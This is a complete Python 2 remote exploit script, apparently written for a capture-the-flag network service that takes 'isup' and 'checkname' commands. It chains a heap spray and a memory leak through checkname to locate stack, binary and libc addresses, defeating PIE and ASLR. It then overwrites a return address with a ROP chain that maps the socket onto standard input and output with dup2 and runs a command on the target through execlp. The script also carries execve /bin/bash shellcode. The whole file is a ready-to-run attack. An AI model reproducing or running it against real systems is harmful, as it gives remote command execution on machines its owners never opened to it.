from socket import *
import sys, struct
import time

SHELLCODE = ("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
             "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
             "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
             "\x51\x53\x89\xe1\xcd\x80")

COMMAND = 'id\0'

LEAK = 'isup '.ljust(512, 'A') * 512
LEAVE = 0x00004691

CLEAN_C = 0x155D
FDWRITE = 0x2F90
FDREAD = 0x2F30
JMP_WRITE = 0x1780
JMP_READ = 0x15B0
ADDR_BIND = 0x61B4
JMP_BIND = 0x17B0
GET_PC_THUNK = 0x1C67
DELTA_BIND_SYSTEM = 0x96a40
LIBC_SYSTEM = 0x3cb20
LIBC_DUP2 = 0xc1c90
LIBC_EXECLP = 0x9bdc0

def addr_valid(addr):
    if type(addr) in (int, long):
        addr = struct.pack('<L', addr)
    return not (set(addr) & set('@\0\r\n'))

class Exploit(object):
    def __init__(self, ip, port):
        self.ip, self.port = ip, port
        self.s = None
        self.fd_addr = None
        self.stack_addr_list = []
        self.dummy = []
        self.base = None
        self.libc = None
        self.cmd_addr = None

    def connect(self):
        self.s = create_connection((self.ip, self.port))

    def close(self):
        for dum in self.dummy:
            dum.close()
        self.s.close()

    def readline(self):
        res = []
        while True:
            c = self.s.recv(1)
            res.append(c)
            if c == '' or c == '\n':
                break
        return ''.join(res)

    def readall(self):
        self.s.settimeout(3)
        data = ''
        while True:
            try:
                data += self.s.recv(2048)
            except timeout:
                break
        self.s.settimeout(None)
        return data

    def get_banner(self):
        self.readline()

    def send_leak(self):
        self.s.sendall(LEAK)

    def find_fd_addr(self):
        print 'searching for isuparg in heap...'
        buf = []
        for i in xrange(0, 0x10000, 4):
            addr = struct.pack('<HBB', i, 0xBB, 0xBB)
            if not addr_valid(addr):
                continue
            buf.append(('checkname ' + 'A' * 32 + addr).ljust(512, '\0'))
        buf = ''.join(buf)
        self.s.sendall(buf)
        line = self.readline()
        self.readall() # empty the junk the server sends us
        self.fd_addr = struct.unpack('<L', line[32:36])[0]

    def spray(self):
        t = time.time()
        for i in xrange(0x1000000 / 0x8000):
            self.dummy.append(Exploit(self.ip, self.port))
            self.dummy[-1].connect()
            self.dummy[-1].get_banner()
            self.dummy[-1].s.sendall('A' * 512)

            self.send_leak()

        '''for dum in self.dummy:
            dum.close()'''

        t = time.time() - t

        print 'spraying done', t
        time.sleep(1)

    def read_cstr(self, addr):
        raw_addr = struct.pack('<LL', self.fd_addr, addr)
        assert addr_valid(raw_addr)
        self.s.send('checkname ' + 'A' * 32 + raw_addr + '\n')
        line = self.readline()
        line = line[:-len(' is not indexed already\n')]
        return line

    def read_mem(self, addr, size):
        data = ''
        while len(data) < size:
            data += self.read_cstr(addr + len(data))
            data += '\0'
        return data[:size]

    def find_stack(self):
        print 'scanning heap for stack...'

        addr = self.fd_addr - 4
        delta = 0
        for i in xrange(0x10000):
            if (delta > 0x10000) or not addr_valid(addr):
                if delta > 0x10000:
                    addr -= delta
                # if we can't read the address try to return to split
                while True:
                    addr += 4
                    if not addr_valid(addr):
                        continue
                    raw_addr = self.read_cstr(addr)
                    if raw_addr in ('\x01\x02', '\x11', '\xa1\x83'): # common chunk sizes
                        break # we are again in the split of the chunk headers

            raw_addr = self.read_mem(addr, 4)
            delta = struct.unpack('<L', raw_addr)[0]
            # print hex(addr), hex(delta)

            if delta == 0x83a1:
                self.stack_addr_list.append(addr + 4)
                print 'found stack number', len(self.stack_addr_list)
                if len(self.stack_addr_list) == 8:
                    break

            delta &= ~0b111
            addr += delta

    def break_pie(self):
        ret_addr = self.stack_addr_list[0] + 0x8118

        while not addr_valid(ret_addr):
            ret_addr += 1
        junk = self.read_cstr(ret_addr)
        ret_addr += len(junk) + 0x1c

        ret = self.read_mem(ret_addr, 4)
        self.base = struct.unpack('<L', ret)[0]
        self.base -= 0x4396

        ret = self.read_mem(ret_addr + 0x20, 4)
        self.libc = struct.unpack('<L', ret)[0]
        self.libc -= 0x3d5ab

        # the buffer one of the dummies sent
        self.cmd_addr = ret_addr - 0x21c

    def send_payload(self):
        fd = self.read_mem(self.fd_addr, 2)
        fd = struct.unpack('<H', fd)[0]

        cmd_addr_offset = self.cmd_addr - self.stack_addr_list[0]
        for stack_addr in self.stack_addr_list:
            payload = 'A' * 32
            payload += struct.pack('<L', self.fd_addr) * 2 # edi and esi
            payload += struct.pack('<L', stack_addr + cmd_addr_offset) # ebp to be esp
            payload += struct.pack('<L', self.base + LEAVE)

            if addr_valid(payload):
                break
        else:
            print 'all payloads with invalid bytes'
            return

        self.cmd_addr = stack_addr + cmd_addr_offset

        new_stack = 'B' * 0x20

        new_stack += struct.pack('<L', self.libc + LIBC_DUP2)
        new_stack += struct.pack('<L', CLEAN_C + self.base)
        new_stack += struct.pack('<L', fd)
        new_stack += struct.pack('<L', 0)
        new_stack += struct.pack('<L', 0xcccccccc)

        new_stack += struct.pack('<L', self.libc + LIBC_DUP2)
        new_stack += struct.pack('<L', CLEAN_C + self.base)
        new_stack += struct.pack('<L', fd)
        new_stack += struct.pack('<L', 1)
        new_stack += struct.pack('<L', 0xcccccccc)

        new_stack += struct.pack('<L', self.libc + LIBC_DUP2)
        new_stack += struct.pack('<L', CLEAN_C + self.base)
        new_stack += struct.pack('<L', fd)
        new_stack += struct.pack('<L', 2)
        new_stack += struct.pack('<L', 0xcccccccc)

        new_stack += struct.pack('<L', self.libc + LIBC_EXECLP)
        new_stack += struct.pack('<L', CLEAN_C + self.base)
        new_stack += struct.pack('<L', self.cmd_addr + len(new_stack) + 16) * 2
        new_stack += struct.pack('<L', 0)
        new_stack += struct.pack('<L', 0xcccccccc)
        new_stack += COMMAND

        for dum in self.dummy:
            dum.s.sendall(new_stack)

        time.sleep(1)
        self.s.sendall('checkname ' + payload + '\n')
        print repr(self.readline())

def main():
    ip = sys.argv[1]
    port = int(sys.argv[2])

    exploit = Exploit(ip, port)
    exploit.connect()
    exploit.get_banner()
    exploit.spray()
    exploit.find_fd_addr()
    exploit.find_stack()
    exploit.break_pie()
    exploit.send_payload()
    exploit.close()

if '__main__' == __name__:
    main()

